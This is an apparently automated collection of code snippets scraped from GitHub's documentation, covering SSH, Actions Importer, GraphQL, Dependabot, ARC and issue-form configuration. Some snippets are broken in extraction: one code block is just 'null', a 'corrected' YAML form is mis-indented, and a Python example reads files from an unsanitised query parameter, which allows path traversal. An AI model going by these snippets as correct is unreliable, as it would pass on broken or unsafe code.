https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_7\n\nLANGUAGE: PowerShell\nCODE:\n```\n# start the ssh-agent in the background\nGet-Service -Name ssh-agent | Set-Service -StartupType Manual\nStart-Service ssh-agent\n```\n\n----------------------------------------\n\nTITLE: Creating Python Config File\nDESCRIPTION: This Python code defines a configuration dictionary and several functions to access configuration values. It simulates a config file for the website, defining site name, URL, navigation menu, and version.  It also includes functions for accessing page content and initializing templates. The `request` object from Flask is expected to be in scope for some functions.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/using-copilot-to-migrate-a-project.md#_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nconfig = {\n      'name': 'Simple Python Website',\n      'site_url': '',\n      'pretty_uri': False,\n      'nav_menu': {\n         '': 'Home',\n         'about-us': 'About Us',\n         'products': 'Products',\n         'contact': 'Contact',\n      },\n     'template_path': 'template',\n     'content_path': 'content',\n     'version': 'v3.1',\n   }\n\n   def get_config(key=''):\n      return config.get(key, None)\n\n   def site_name():\n      return get_config('name')\n\n   def site_url():\n      return get_config('site_url')\n\n   def site_version():\n      return get_config('version')\n\n   def nav_menu(sep=' | '):\n      nav_menu = ''\n      nav_items = get_config('nav_menu')\n\n      for uri, name in nav_items.items():\n         query_string = request.args.get('page', '')\n         class_active = ' active' if query_string == uri else ''\n         url = f\"{get_config('site_url')}/{'' if get_config('pretty_uri') or uri == '' else '?page='}{uri}\"\n\n         nav_menu += f'<a href=\"{url}\" title=\"{name}\" class=\"item{class_active}\">{name}</a>{sep}'\n\n      return nav_menu.strip(sep)\n\n   def page_title():\n      page = request.args.get('page', 'Home')\n      return ' '.join(word.capitalize() for word in page.split('-'))\n\n   def page_content():\n      page = request.args.get('page', 'home')\n      path = os.path.join(os.getcwd(), get_config('content_path'), f'{page}.phtml')\n\n      if not os.path.exists(path):\n         path = os.path.join(os.getcwd(), get_config('content_path'), '404.phtml')\n\n      with open(path, 'r') as file:\n         return file.read()\n\n   def init():\n      template_path = os.path.join(get_config('template_path'), 'template.html')\n      with open(template_path, 'r') as file:\n         return file.read()\n```\n\n----------------------------------------\n\nTITLE: Example Docker Tag Command\nDESCRIPTION: This is an example of the `docker tag` command, showing how to tag a Docker image for the GitHub Container Registry. Replace the image id with the image's id to push the new image to the registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndocker tag 38f737a91f39 {% ifversion fpt or ghec %}ghcr.io{% elsif ghes %}{% data reusables.package_registry.container-registry-example-hostname %}{% endif %}/octocat/hello_docker:latest\n```\n\n----------------------------------------\n\nTITLE: CircleCI config file format\nDESCRIPTION: This YAML configuration file provides a format for specifying CircleCI repositories and configuration file paths for the GitHub Actions Importer.  Each entry defines a repository slug and the path to the corresponding `.circleci/config.yml` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nsource_files:\n  - repository_slug: circle-org-name/circle-project-name\n    path: path/to/.circleci/config.yml\n  - repository_slug: circle-org-name/some-other-circle-project-name\n    path: path/to/.circleci/config.yml\n```\n\n----------------------------------------\n\nTITLE: Defining a matrix in Travis CI YAML\nDESCRIPTION: This snippet demonstrates how to define a matrix in Travis CI's YAML configuration. The matrix allows for testing across different environments, such as different Ruby versions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmatrix:\n  include:\n    - rvm: '2.5'\n    - rvm: '2.6.3'\n```\n\n----------------------------------------\n\nTITLE: Querying Project Fields (Common) with GitHub CLI\nDESCRIPTION: This snippet uses the GitHub CLI to query the first 20 fields of a GitHub project, retrieving only the ID and name using the `ProjectV2FieldCommon` object. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID. Requires the `gh` CLI tool to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\\n  node(id: \"PROJECT_ID\") {\\n    ... on ProjectV2 {\\n      fields(first: 20) {\\n        nodes {\\n          ... on ProjectV2FieldCommon {\\n            id\\n            name\\n          }\\n        }\\n      }\\n    }\\n  }\\n}'\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer\nDESCRIPTION: This code snippet demonstrates how to update the GitHub Actions Importer to the latest version using the `gh actions-importer update` command. This command ensures that the tool is running the most current version of the container image. This step is important to ensure compatibility and access to the latest features and bug fixes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Auditing Travis CI with GitHub Actions Importer\nDESCRIPTION: This code snippet demonstrates how to perform an audit of a Travis CI server using the `gh actions-importer audit travis-ci` command.  The audit generates a report summarizing the completeness and complexity of migrating pipelines. The `--output-dir` flag specifies the directory where the audit results will be stored.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit travis-ci --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Configure Sinatra Server\nDESCRIPTION: This config.ru file configures the Sinatra server to run the GHAapp application defined in the server.rb file. It requires the server.rb file and specifies that the GHAapp class should handle incoming requests.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nrequire './server'\nrun GHAapp\n```\n\n----------------------------------------\n\nTITLE: Analyzing `run_container_step` Input JSON (Dockerfile)\nDESCRIPTION: This JSON showcases the input for the `run_container_step` command when using a Dockerfile.  Instead of specifying an `image`, it provides the path to a `Dockerfile`. Other parameters, such as entry point, working directory, environment variables, and mount volumes, are also configured. It also specifies system mount volumes and user mount volumes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"command\": \"run_container_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"services\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"image\": null,\n    \"dockerfile\": \"/__w/_actions/foo/dockerfile\",\n    \"entryPointArgs\": [\"hello world\"],\n    \"entryPoint\": \"echo\",\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n    \"createOptions\": \"--cpus 1\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"userMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"my_docker_volume\",\n        \"targetVolumePath\": \"/volume_mount\",\n        \"readOnly\": false\n      }\n    ],\n    \"systemMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n        \"targetVolumePath\": \"/__w\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n        \"targetVolumePath\": \"/__e\",\n        \"readOnly\": true\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n        \"targetVolumePath\": \"/__w/_temp\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n        \"targetVolumePath\": \"/__w/_actions\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n        \"targetVolumePath\": \"/__w/_tool\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n        \"targetVolumePath\": \"/github/home\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n        \"targetVolumePath\": \"/github/workflow\",\n        \"readOnly\": false\n      }\n    ],\n    \"registry\": null,\n    \"portMappings\": { \"80\": \"801\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: General Copilot Prompt for Error Debugging\nDESCRIPTION: This prompt is a template for using GitHub Copilot Chat to debug a generic error message from your code. Replace `YOUR-ERROR-MESSAGE` with the specific error you are encountering. Copilot will attempt to explain the error and provide a fix.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nExplain in depth why my code produces the following error and how I can fix it:\n\nYOUR-ERROR-MESSAGE\n```\n\n----------------------------------------\n\nTITLE: Docker Dependabot Configuration\nDESCRIPTION: This snippet shows a Dependabot configuration file (`dependabot.yml`) for Docker, defining access to a private registry.  It includes the registry type, URL, username, and password (using a secret). Remove `replaces-base: true` from the configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nregistries:\n  azuretestregistry: # Define access for a private registry\n    type: docker-registry\n    url: firewallregistrydep.azurecr.io\n    username: firewallregistrydep\n    password: {% raw %}${{ secrets.AZUREHUB_PASSWORD }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Declaring Gradle Groovy dependency\nDESCRIPTION: This snippet shows how to declare a package dependency in a Gradle Groovy build file.  It specifies the `com.example:package` as an implementation dependency.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndependencies {\n    implementation 'com.example:package'\n}\n```\n\n----------------------------------------\n\nTITLE: Querying enterprise databaseId using GraphQL\nDESCRIPTION: This GraphQL query retrieves the `databaseId` for a given enterprise slug. The `slug` variable needs to be set to the enterprise's slug. The query returns the `slug` and `databaseId` of the enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/configuring-private-networking-for-github-hosted-runners-in-your-enterprise.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery(\n  $slug: String!\n){\n  enterprise (slug: $slug)\n  {\n    slug\n    databaseId\n  }\n}\n'\nVariables\n{\n  \"slug\": \"ENTERPRISE_SLUG\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Template Chooser with config.yml - YAML\nDESCRIPTION: This snippet shows how to configure the template chooser using a `config.yml` file in the `.github/ISSUE_TEMPLATE` directory. It demonstrates disabling blank issues and adding contact links to direct users to external resources. The `blank_issues_enabled` setting controls whether users can create blank issues, and the `contact_links` section allows for specifying links to external sites for support or bug reports.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/configuring-issue-templates-for-your-repository.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nblank_issues_enabled: false\ncontact_links:\n  - name: {% data variables.product.prodname_gcf %}\n    url: https://github.com/orgs/community/discussions\n    about: Please ask and answer questions here.\n  - name: {% data variables.product.prodname_dotcom %} Security Bug Bounty\n    url: https://bounty.github.com/\n    about: Please report security vulnerabilities here.\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Copilot in the CLI\nDESCRIPTION: This command opens the GitHub Copilot configuration menu in the CLI, allowing users to modify settings such as default execution confirmation and optional usage analytics.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-the-cli.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh copilot config\n```\n\n----------------------------------------\n\nTITLE: Dry-run Azure DevOps Release Pipeline Migration to GitHub Actions\nDESCRIPTION: This command performs a dry run of migrating an Azure DevOps release pipeline to a GitHub Actions workflow. It requires the pipeline ID and specifies an output directory for the converted workflow files and logs. The command does not create a pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run azure-devops release --pipeline-id :pipeline_id --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Cloning Repository via SSH over HTTPS - Shell\nDESCRIPTION: This command clones a repository using SSH over the HTTPS port (443).  It constructs the SSH URL with the correct hostname (ssh.{% data variables.product.product_url %}) and port (443) and passes it to `git clone`. Replace YOUR-USERNAME and YOUR-REPOSITORY with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/using-ssh-over-the-https-port.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngit clone ssh://git@ssh.{% data variables.product.product_url %}:443/YOUR-USERNAME/YOUR-REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Downloading BBS2GH Migration Log with GitHub CLI\nDESCRIPTION: Downloads the latest migration log for an individual repository when the migration source is Bitbucket Server, using the `gh bbs2gh download-logs` command.  Requires the DESTINATION organization, REPOSITORY name, and a FILENAME for the log file. A {% data variables.product.pat_generic %} with appropriate scopes is needed.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/accessing-your-migration-logs-for-github-enterprise-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh bbs2gh download-logs --github-target-org DESTINATION --target-repo REPOSITORY --migration-log-file FILENAME\n```\n\n----------------------------------------\n\nTITLE: Fixing Incorrect Data Type for Label in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: label must be a string\" error. It happens when the `label` attribute, which expects a string, receives a different data type (e.g., a Boolean). The corrected example provides string values for the `label` attribute, demonstrating how to handle potentially misinterpreted values by wrapping them in quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n- type: textarea\n  attributes:\n    label: Bug Description\n- type: textarea\n  attributes:\n    label: true\n```\n\nLANGUAGE: yaml\nCODE:\n```\n-\n type: markdown\n attributes:\n value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n- type: textarea\n attributes:\n label: Bug Description\n- type: textarea\n attributes:\n label: Environment Details\n```\n\n----------------------------------------\n\nTITLE: Using an Action in the Same Repository (YAML)\nDESCRIPTION: This YAML snippet shows how to use an action located within the same repository as the workflow file.  It uses a relative path (`./path/to/dir`) to point to the action's directory. It is crucial to checkout the repository before using this action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nnull\n```\n\n----------------------------------------\n\nTITLE: Running a Production Migration for a Bamboo Deployment Project\nDESCRIPTION: This command migrates a Bamboo deployment project to a GitHub Actions workflow and opens a pull request with the converted workflow. The `--deployment-project-id` parameter specifies the ID of the Bamboo deployment project. The `--target-url` parameter specifies the URL of the GitHub repository. The `--output-dir` parameter specifies the output directory for logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer migrate bamboo deployment --deployment-project-id :my_deployment_project_id --target-url :target_url --output-dir tmp/migrate\n```\n\n----------------------------------------\n\nTITLE: Configuring Metrics in values.yaml - YAML\nDESCRIPTION: This snippet shows how to configure the `metrics` property in the `values.yaml` file of the `gha-runner-scale-set-controller` chart to enable metrics for ARC. It defines the addresses for the controller manager and listener, and the endpoint for exposing the metrics.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_31\n\nLANGUAGE: YAML\nCODE:\n```\nmetrics:\n  controllerManagerAddr: \":8080\"\n  listenerAddr: \":8080\"\n  listenerEndpoint: \"/metrics\"\n```\n\n----------------------------------------\n\nTITLE: Querying organization databaseId with curl\nDESCRIPTION: This curl command retrieves the `databaseId` of an organization using the GitHub GraphQL API. Requires a valid `BEARER_TOKEN` for authentication and the organization `login`. The `databaseId` is essential for subsequent Azure configuration steps.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-organization-settings/configuring-private-networking-for-github-hosted-runners-in-your-organization.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer BEARER_TOKEN\" -X POST \\\n  -d '{ \"query\": \"query($login: String!) { organization (login: $login) { login databaseId } }\" ,\n        \"variables\": {\n          \"login\": \"ORGANIZATION_LOGIN\"\n        }\n      }' \\\nhttps://api.github.com/graphql\n```\n\n----------------------------------------\n\nTITLE: Download multiple specific workflow artifacts using gh CLI\nDESCRIPTION: Downloads multiple specific artifacts from a workflow run using the `gh run download` subcommand and multiple `-n` flags. `RUN_ID` is replaced with the ID of the run, and `ARTIFACT_NAME-1` and `ARTIFACT_NAME-2` are replaced with the names of the artifacts. Requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/downloading-workflow-artifacts.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh run download RUN_ID> -n ARTIFACT_NAME-1 -n ARTIFACT_NAME-2\n```\n\n----------------------------------------\n\nTITLE: Configuring Controller Image from Private Registry\nDESCRIPTION: This snippet configures the controller image to be pulled from a private container registry.  It sets the `image.repository`, `image.pullPolicy`, and `imagePullSecrets` properties in the controller's `values.yaml` file.  A Kubernetes secret with registry credentials (`<registry-secret-name>`) must exist.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nimage:\n  repository: \"custom-registry.io/gha-runner-scale-set-controller\"\n  pullPolicy: IfNotPresent\n  # Overrides the image tag whose default is the chart appVersion.\n  tag: \"0.4.0\"\n\nimagePullSecrets:\n  - name: <registry-secret-name>\n```\n\n----------------------------------------\n\nTITLE: Basic CodeQL Results Upload Example - Shell\nDESCRIPTION: This snippet provides a basic example of uploading CodeQL analysis results to GitHub. It uses the `codeql github upload-results` command, specifying the repository, ref, commit, and SARIF file. It assumes the `GITHUB_TOKEN` environment variable is set with a valid {% data variables.product.prodname_github_app %} or {% data variables.product.pat_generic %}.  It requires CodeQL CLI to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/uploading-codeql-analysis-results-to-github.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncodeql github upload-results \\\n    --repository=my-org/example-repo \\\n    --ref=refs/heads/main --commit=deb275d2d5fe9a522a0b7bd8b6b6a1c939552718 \\\n    --sarif=/temp/example-repo-js.sarif {% ifversion ghes %}--github-url=https://HOSTNAME \\\n    {% endif %}\n```\n\n----------------------------------------\n\nTITLE: Adding Item to Project with curl\nDESCRIPTION: This snippet uses curl to add an issue or pull request to a GitHub project. The `PROJECT_ID` placeholder needs to be replaced with the project's node ID, and `CONTENT_ID` with the issue or pull request's node ID. `TOKEN` needs to be replaced with a personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_15\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {addProjectV2ItemById(input: {projectId: \\\"PROJECT_ID\\\" contentId: \\\"CONTENT_ID\\\"}) {item {id}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Example Tagging and Publishing (github.com)\nDESCRIPTION: This example demonstrates how to tag an existing image and push it to the github.com GitHub Packages registry.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ docker images\n\n> REPOSITORY           TAG      IMAGE ID      CREATED      SIZE\n> monalisa             1.0      c75bebcdd211  4 weeks ago  1.11MB\n\n# Tag the image with OWNER/REPO/IMAGE_NAME\n$ docker tag c75bebcdd211 docker.pkg.github.com/octocat/octo-app/monalisa:1.0\n\n# Push the image to {% data variables.product.prodname_registry %}\n$ docker push docker.pkg.github.com/octocat/octo-app/monalisa:1.0\n```\n\n----------------------------------------\n\nTITLE: Fixing Similar Labels in YAML\nDESCRIPTION: This snippet shows how to fix the 'Labels are too similar' error.  When an id attribute is not provided for an input, the label attribute is used to generate a reference to the input field. To fix this, add at least one differentiating alphanumeric character, `-`, or `_` to one of the clashing labels, or add unique IDs.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  attributes:\n    label: Name?\n- type: input\n  id: name\n  attributes:\n    label: Name???????\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  attributes:\n    label: Name?\n- type: input\n  attributes:\n    label: Your name\n\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  attributes:\n    label: Name?\n- type: input\n  id: your-name\n  attributes:\n    label: Name???????\n\n```\n\n----------------------------------------\n\nTITLE: Polling Notifications API with curl\nDESCRIPTION: This snippet demonstrates how to poll the GitHub Notifications API using `curl`. It shows how to add authentication and use the `Last-Modified` header for efficient polling, preventing unnecessary rate limit consumption. The example also illustrates how to interpret the `X-Poll-Interval` header to avoid being rate limited.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/activity/notifications.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# Add authentication to your requests\n$ curl -I {% data variables.product.rest_url %}/notifications\nHTTP/2 200\nLast-Modified: Thu, 25 Oct 2012 15:16:27 GMT\nX-Poll-Interval: 60\n\n# Pass the Last-Modified header exactly\n$ curl -I {% data variables.product.rest_url %}/notifications\n$    -H \"If-Modified-Since: Thu, 25 Oct 2012 15:16:27 GMT\"\n> HTTP/2 304\n> X-Poll-Interval: 60\n```\n\n----------------------------------------\n\nTITLE: Stopping replication permanently using ghe-repl-stop (Shell)\nDESCRIPTION: This shell command stops the replication process on the specified GitHub Enterprise Server replica before permanently removing it. It requires administrative access to the replica server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/removing-a-high-availability-replica.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-stop\n```\n\n----------------------------------------\n\nTITLE: Multiple Code Search Terms\nDESCRIPTION: This snippet shows how to search for documents that contain multiple terms. The results will include all documents containing both terms in any order.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nsparse index\n```\n\n----------------------------------------\n\nTITLE: Querying previous page of pull requests using cursor in GraphQL\nDESCRIPTION: This GraphQL query retrieves the previous page of pull requests for a given repository using a cursor obtained from a previous response. It specifies the `owner` and `name` of the repository, retrieves the last pull request before the given cursor (`last: 1, before: \"R3Vyc29yOnYyOpHOHcfoOg==\"`), and returns the `createdAt`, `number`, and `title` of each pull request. The `pageInfo` object contains the `startCursor` and `hasPreviousPage` fields to determine if there are more previous pages.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-pagination-in-the-graphql-api.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery($owner: String!, $name: String!) {\n  repository(owner: $owner, name: $name) {\n    pullRequests(last: 1, before: \"R3Vyc29yOnYyOpHOHcfoOg==\") {\n      nodes {\n        createdAt\n        number\n        title\n      }\n      pageInfo {\n        startCursor\n        hasPreviousPage\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Pull Request Data with REST (Multiple Calls)\nDESCRIPTION: This section demonstrates how to retrieve a pull request along with its commits, comments, and reviews using multiple REST API calls. Each piece of data requires a separate API request.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/pulls/:number\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/pulls/:number/commits\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/issues/:number/comments\ncurl -v {% data variables.product.rest_url %}/repos/:owner/:repo/pulls/:number/reviews\n```\n\n----------------------------------------\n\nTITLE: Checking for Out-of-Memory Processes in Logs\nDESCRIPTION: This command uses `rg` (ripgrep) to search syslog files for instances where the kernel has killed a process due to running out of memory. It helps identify specific processes that are exceeding memory limits.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nrg -z 'kernel: Out of memory: Killed process' /var/log/syslog*\n```\n\n----------------------------------------\n\nTITLE: Language Qualifier in Code Search\nDESCRIPTION: This snippet demonstrates how to narrow down searches to specific languages using the `language:` qualifier and the `OR` operator.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_12\n\nLANGUAGE: text\nCODE:\n```\nlanguage:ruby OR language:cpp OR language:csharp\n```\n\n----------------------------------------\n\nTITLE: Running the Git LFS Installation Script (macOS/Linux)\nDESCRIPTION: This command executes the `install.sh` script located in the current directory to install Git LFS.  It initializes Git LFS on the system. The `sudo` prefix might be required depending on user permissions.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/installing-git-large-file-storage.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ ./install.sh\n> {% data variables.large_files.product_name_short %} initialized.\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_REF_PATH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_REF_PATH` to the GitHub Actions equivalent `${{ github.ref }}`. Repository ref.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_64\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.ref }}\n```\n\n----------------------------------------\n\nTITLE: Install .NET dependencies\nDESCRIPTION: This snippet demonstrates how to install .NET dependencies using the `dotnet add package` command. It adds the `Newtonsoft.Json` package with a specific version (12.0.1) to the project.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-net.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Setup dotnet\n  uses: {% data reusables.actions.action-setup-dotnet %}\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1\n```\n\n----------------------------------------\n\nTITLE: HTML form for GitHub OAuth authorization\nDESCRIPTION: This HTML snippet creates a simple form with a link that redirects the user to the GitHub OAuth authorization endpoint. It includes the 'user:email' scope and dynamically inserts the client ID.  The client ID is injected server-side through the erb templating engine.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n  </head>\n  <body>\n    <p>\n      Well, hello there!\n    </p>\n    <p>\n      We're going to now talk to the GitHub API. Ready?\n      <a href=\"https://github.com/login/oauth/authorize?scope=user:email&client_id=<%= client_id %>\">Click here</a> to begin!\n    </p>\n    <p>\n      If that link doesn't work, remember to provide your own <a href=\"/apps/building-oauth-apps/authorizing-oauth-apps/\">Client ID</a>!\n    </p>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Adding a terminal profile in settings.json\nDESCRIPTION: This snippet shows how to add a new terminal profile for a shell in the `settings.json` file for VS Code. Replace `OPERATING-SYSTEM` with the operating system (e.g., `linux`) and `SHELL` with the name of the shell (e.g., `csh`). The `path` should be the command to execute the shell.\nSOURCE: 